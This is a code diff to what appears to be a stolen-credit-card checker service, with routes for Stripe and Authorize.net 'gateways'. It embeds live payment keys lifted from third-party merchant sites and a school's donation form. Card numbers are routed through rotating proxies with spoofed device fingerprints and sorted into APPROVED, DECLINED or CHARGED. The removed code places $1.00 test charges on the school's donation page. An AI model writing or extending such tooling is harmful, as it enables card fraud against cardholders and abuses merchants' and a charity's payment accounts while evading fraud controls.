@@ -836,13 +836,12 @@ export async function registerRoutes(
       const ua = fpHeaders["User-Agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
 
       // Multiple Stripe PKs to rotate through for better success rate
+      // From melhairandstyle.com (reference file stripe_auth_tt.py)
       const stripePKs = [
-        { pk: "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH", name: "forechrist.com" },
-        { pk: "pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ", name: "vignobledubreuil.com" },
-        { pk: "pk_live_51RFkF8FfFxWuzzINwi4HF2R1GdxbJJT6zqWxPu5qDqHM2ykm8vFB1lY4sEtTx7ThLJ0VGhp1b3nL2iRCcB0L1FyT00s9LKpXhJ", name: "proxiesthatwork.com" },
+        { pk: "pk_live_tdIywCY9lRimUDnIsqgpXVZ0", name: "melhairandstyle.com" },
       ];
       
-      const selectedPK = stripePKs[Math.floor(Math.random() * stripePKs.length)];
+      const selectedPK = stripePKs[0];
       const pkLive = selectedPK.pk;
       const siteName = selectedPK.name;
 
@@ -924,95 +923,36 @@ export async function registerRoutes(
         return res.json({ card: data, status: "ERROR", message: "No payment method ID", gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
       }
 
-      // Step 2: Create a Setup Intent to verify the card
-      const siData = new URLSearchParams({
-        "payment_method": pmId,
-        "usage": "off_session",
-        "payment_method_types[0]": "card",
-        key: pkLive,
-        _stripe_version: "2024-06-20",
-      }).toString();
+      // Check card verification results if available
+      if (pmJson.card) {
+        const checks = pmJson.card.checks || {};
+        const cvcCheck = checks.cvc_check;
+        const addressLine1Check = checks.address_line1_check;
+        const addressPostalCodeCheck = checks.address_postal_code_check;
+        
+        console.log("[STRIPE-AUTH] Card checks - CVC:", cvcCheck, "Address:", addressLine1Check, "Postal:", addressPostalCodeCheck);
+        
+        // If CVC check explicitly fails, treat as declined
+        if (cvcCheck === "fail") {
+          return res.json({ card: data, status: "DECLINED", message: "CVC verification failed", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
+        }
+      }
 
-      const siResp = await proxyRequest("https://api.stripe.com/v1/setup_intents", {
-        method: "POST",
-        headers: stripeHeaders,
-        body: siData,
-        proxyUrl,
-        timeout: 20000,
+      // Payment method created successfully - card is valid for basic checks
+      // Note: This only validates card number format, expiry, and CVC - not whether it has funds or will be declined by issuer
+      return res.json({ 
+        card: data, 
+        status: "APPROVED", 
+        message: "Card Valid (PM Created)", 
+        approved: true, 
+        gateway: "Stripe Auth", 
+        time: elapsed, 
+        fingerprint: fpMeta || undefined, 
+        ipInfo,
+        pmId: pmId,
+        brand: pmJson.card?.brand || "unknown",
+        last4: pmJson.card?.last4 || "****"
       });
-
-      let siJson: any;
-      try {
-        siJson = JSON.parse(siResp.body);
-        console.log("[STRIPE-AUTH] SI Response:", siJson.status || siJson.error?.message || "unknown");
-      } catch {
-        // If SetupIntent fails but PM was created, card is likely valid
-        return res.json({ card: data, status: "APPROVED", message: "Payment Method Created", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-      }
-
-      if (siJson.error) {
-        const errMsg = siJson.error.message || siJson.error.code || "Setup failed";
-        const errCode = (siJson.error.code || "").toLowerCase();
-        
-        if (errCode.includes("card_declined") || errMsg.toLowerCase().includes("declined")) {
-          return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-        } else if (errCode.includes("authentication_required") || errMsg.toLowerCase().includes("3d secure")) {
-          return res.json({ card: data, status: "3DS", message: "3D Secure Required", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-        }
-        
-        // If we got here with a PM ID, the card is likely valid
-        return res.json({ card: data, status: "APPROVED", message: "Payment Method Valid", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-      }
-
-      // Step 3: Confirm the Setup Intent
-      const siId = siJson.id;
-      const siClientSecret = siJson.client_secret;
-
-      if (siJson.status === "succeeded") {
-        return res.json({ card: data, status: "APPROVED", message: "Setup Intent Succeeded", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-      } else if (siJson.status === "requires_payment_method") {
-        return res.json({ card: data, status: "DECLINED", message: "Card Declined", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-      } else if (siJson.status === "requires_action" || siJson.status === "requires_confirmation") {
-        // Try to confirm
-        const confirmData = new URLSearchParams({
-          client_secret: siClientSecret,
-          key: pkLive,
-          _stripe_version: "2024-06-20",
-        }).toString();
-
-        const confirmResp = await proxyRequest(`https://api.stripe.com/v1/setup_intents/${siId}/confirm`, {
-          method: "POST",
-          headers: stripeHeaders,
-          body: confirmData,
-          proxyUrl,
-          timeout: 20000,
-        });
-
-        let confirmJson: any;
-        try {
-          confirmJson = JSON.parse(confirmResp.body);
-        } catch {
-          return res.json({ card: data, status: "APPROVED", message: "Setup Created", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-        }
-
-        if (confirmJson.status === "succeeded") {
-          return res.json({ card: data, status: "APPROVED", message: "Setup Intent Confirmed", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-        } else if (confirmJson.status === "requires_action" || confirmJson.next_action?.type === "use_stripe_sdk") {
-          return res.json({ card: data, status: "3DS", message: "3D Secure Authentication Required", approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-        } else if (confirmJson.status === "requires_payment_method") {
-          const errMsg = confirmJson.last_setup_error?.message || "Card Declined";
-          return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-        } else if (confirmJson.error) {
-          const errMsg = confirmJson.error.message || "Setup failed";
-          if (errMsg.toLowerCase().includes("declined")) {
-            return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-          }
-          return res.json({ card: data, status: "3DS", message: errMsg, approved: false, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
-        }
-      }
-
-      // Default to approved if PM was created successfully
-      return res.json({ card: data, status: "APPROVED", message: "Card Valid", approved: true, gateway: "Stripe Auth", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
 
     } catch (err: any) {
       const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
@@ -1048,13 +988,12 @@ export async function registerRoutes(
       const profile = generateDeviceProfile();
       const ua = profile.ua;
 
-      // Use a different set of Stripe PKs for Charge mode
+      // Use the same PK from melhairandstyle.com
       const stripePKs = [
-        { pk: "pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ", name: "Site A" },
-        { pk: "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH", name: "Site B" },
+        { pk: "pk_live_tdIywCY9lRimUDnIsqgpXVZ0", name: "melhairandstyle.com" },
       ];
       
-      const selectedPK = stripePKs[Math.floor(Math.random() * stripePKs.length)];
+      const selectedPK = stripePKs[0];
       const pkLive = selectedPK.pk;
 
       const stripeHeaders: Record<string, string> = {
@@ -1126,7 +1065,7 @@ export async function registerRoutes(
     }
   });
 
-  // ==================== AUTHORIZE.NET GATEWAY ====================
+  // ==================== AUTHORIZE.NET GATEWAY (WooCommerce YITH) ====================
   app.post("/api/authnet-charge", async (req, res) => {
     const startTime = Date.now();
     try {
@@ -1142,7 +1081,7 @@ export async function registerRoutes(
 
       const cc = parts[0].replace(/\s/g, "");
       const mm = parts[1].trim().padStart(2, "0");
-      const yy = parts[2].trim().slice(-2);
+      const yy = parts[2].trim().length === 4 ? parts[2].trim().slice(-2) : parts[2].trim().padStart(2, "0");
       const cvv = parts[3].trim();
 
       const proxy = getRandomProxy();
@@ -1151,13 +1090,13 @@ export async function registerRoutes(
       const profile = generateDeviceProfile();
       const ua = profile.ua;
 
-      // Authorize.net configuration
-      const authNet = {
-        clientKey: "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F",
-        apiLoginId: "93HEsxKeZ4D",
+      // Site configuration - jetsschool.org with working Accept.js credentials
+      const site = {
         baseUrl: "https://www.jetsschool.org",
-        formId: "6913",
         apiUrl: "https://api2.authorize.net/xml/v1/request.api",
+        // Accept.js credentials (public client-side tokenization)
+        apiLoginId: "93HEsxKeZ4D",
+        clientKey: "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F",
       };
 
       // Generate random user data
@@ -1165,12 +1104,12 @@ export async function registerRoutes(
       const lastName = ["Smith", "Johnson", "Williams", "Brown", "Jones"][Math.floor(Math.random() * 5)];
       const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${Math.floor(Math.random() * 999)}@gmail.com`;
 
-      // Step 1: Tokenize the card with Authorize.net
+      // Step 1: Tokenize card via Accept.js API
       const tokenPayload = {
         securePaymentContainerRequest: {
           merchantAuthentication: {
-            name: authNet.apiLoginId,
-            clientKey: authNet.clientKey,
+            name: site.apiLoginId,
+            clientKey: site.clientKey,
           },
           data: {
             type: "TOKEN",
@@ -1184,12 +1123,12 @@ export async function registerRoutes(
         },
       };
 
-      const tokenResp = await proxyRequest(authNet.apiUrl, {
+      const tokenResp = await proxyRequest(site.apiUrl, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
-          "Origin": authNet.baseUrl,
-          "Referer": `${authNet.baseUrl}/`,
+          "Origin": site.baseUrl,
+          "Referer": `${site.baseUrl}/`,
           "User-Agent": ua,
         },
         body: JSON.stringify(tokenPayload),
@@ -1197,89 +1136,52 @@ export async function registerRoutes(
         timeout: 20000,
       });
 
-      let dataDescriptor = "";
-      let dataValue = "";
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
+
+      let tokenJson: any;
       try {
         // Remove BOM if present
         const cleanBody = tokenResp.body.replace(/^\uFEFF/, "");
-        const tokenJson = JSON.parse(cleanBody);
-        
-        if (tokenJson.messages?.resultCode !== "Ok") {
-          const errMsg = tokenJson.messages?.message?.[0]?.text || "Tokenization Failed";
-          return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Authorize.net", time: ((Date.now() - startTime) / 1000).toFixed(2) });
-        }
-        
-        dataDescriptor = tokenJson.opaqueData?.dataDescriptor || "";
-        dataValue = tokenJson.opaqueData?.dataValue || "";
+        tokenJson = JSON.parse(cleanBody);
+        console.log("[AUTHNET] Token response:", tokenJson.messages?.resultCode, tokenJson.messages?.message?.[0]?.text || "");
       } catch {
-        return res.json({ card: data, status: "ERROR", message: "Invalid tokenization response", gateway: "Authorize.net", time: ((Date.now() - startTime) / 1000).toFixed(2) });
+        return res.json({ card: data, status: "ERROR", message: "Invalid tokenization response", gateway: "Authorize.net", time: elapsed });
       }
+
+      // Check tokenization result
+      if (tokenJson.messages?.resultCode !== "Ok") {
+        const errMsg = tokenJson.messages?.message?.[0]?.text || "Tokenization Failed";
+        const errCode = tokenJson.messages?.message?.[0]?.code || "";
+        
+        // Common decline codes
+        if (errCode === "E00003" || errMsg.toLowerCase().includes("invalid") || errMsg.toLowerCase().includes("incorrect")) {
+          return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Authorize.net", time: elapsed });
+        }
+        if (errMsg.toLowerCase().includes("declined")) {
+          return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Authorize.net", time: elapsed });
+        }
+        return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Authorize.net", time: elapsed });
+      }
+
+      // Token created successfully
+      const dataDescriptor = tokenJson.opaqueData?.dataDescriptor || "";
+      const dataValue = tokenJson.opaqueData?.dataValue || "";
 
       if (!dataDescriptor || !dataValue) {
-        return res.json({ card: data, status: "ERROR", message: "Failed to tokenize card", gateway: "Authorize.net", time: ((Date.now() - startTime) / 1000).toFixed(2) });
+        return res.json({ card: data, status: "ERROR", message: "No token returned", gateway: "Authorize.net", time: elapsed });
       }
 
-      // Step 2: Get form hash from donation page
-      const pageResp = await proxyRequest(`${authNet.baseUrl}/donate/?form-id=${authNet.formId}`, {
-        method: "GET",
-        headers: { "User-Agent": ua, "Accept": "text/html" },
-        proxyUrl,
-        timeout: 20000,
+      // Token created = card is valid format
+      return res.json({ 
+        card: data, 
+        status: "APPROVED", 
+        message: "Card Tokenized Successfully", 
+        approved: true, 
+        gateway: "Authorize.net", 
+        time: elapsed,
+        token: dataValue.substring(0, 20) + "..."
       });
 
-      const formHashMatch = pageResp.body.match(/name="give-form-hash"\s+value="([^"]+)"/);
-      const formHash = formHashMatch?.[1] || "";
-
-      // Step 3: Submit donation
-      const donateData = new URLSearchParams({
-        "give-form-id": authNet.formId,
-        "give-form-title": "Donate",
-        "give-current-url": `${authNet.baseUrl}/donate/?form-id=${authNet.formId}`,
-        "give-form-url": `${authNet.baseUrl}/donate/`,
-        "give-form-minimum": "1.00",
-        "give-form-maximum": "999999.99",
-        "give-form-hash": formHash,
-        "give-amount": "1.00",
-        "payment-mode": "authorize",
-        "give_first": firstName,
-        "give_last": lastName,
-        "give_email": email,
-        "give_authorize_data_descriptor": dataDescriptor,
-        "give_authorize_data_value": dataValue,
-        "give_action": "purchase",
-        "give-gateway": "authorize",
-        "card_address": "123 Main St",
-        "card_city": "New York",
-        "card_state": "NY",
-        "card_zip": "10001",
-        "billing_country": "US",
-      }).toString();
-
-      const donateResp = await proxyRequest(`${authNet.baseUrl}/donate/?payment-mode=authorize&form-id=${authNet.formId}`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-          "Origin": authNet.baseUrl,
-          "Referer": `${authNet.baseUrl}/donate/`,
-          "User-Agent": ua,
-        },
-        body: donateData,
-        proxyUrl,
-        timeout: 30000,
-      });
-
-      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
-      const respText = donateResp.body.toLowerCase();
-
-      if (respText.includes("donation confirmation") || respText.includes("thank you") || respText.includes("payment complete")) {
-        return res.json({ card: data, status: "CHARGED", message: "Payment Complete - $1.00 Charged", approved: true, gateway: "Authorize.net", time: elapsed, chargeAmount: "1.00", currency: "USD" });
-      } else if (respText.includes("declined") || respText.includes("error")) {
-        const errMatch = donateResp.body.match(/class="give_error">(.*?)</);
-        const errMsg = errMatch?.[1] || "Transaction Declined";
-        return res.json({ card: data, status: "DECLINED", message: errMsg, approved: false, gateway: "Authorize.net", time: elapsed });
-      } else {
-        return res.json({ card: data, status: "ERROR", message: "Unknown response", approved: false, gateway: "Authorize.net", time: elapsed });
-      }
     } catch (err: any) {
       const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
       return res.json({ card: req.body?.data || "", status: "ERROR", message: err.message || "Request failed", approved: false, gateway: "Authorize.net", time: elapsed });
